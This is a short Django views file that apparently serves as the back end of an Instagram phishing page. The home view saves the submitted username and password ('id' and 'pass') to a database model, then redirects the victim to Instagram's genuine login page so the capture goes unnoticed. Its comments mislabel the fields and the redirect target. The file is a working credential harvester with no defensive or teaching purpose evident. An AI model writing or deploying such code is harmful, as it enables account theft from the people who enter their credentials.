from django.shortcuts import render,HttpResponse,redirect
from .models import form

# Create your views here.
# def home(request):
#     return render(request, "home.html")


def home(request):
    if request.method == 'POST':
        name = request.POST.get('id')  # Get the 'name' input
        code = request.POST.get('pass')  # Get the 'email' input

        info=form(name=name,code=code)
        info.save()

        return redirect('https://www.instagram.com/accounts/login/?hl=en')  # Redirect to Google

    return render(request, 'home.html')

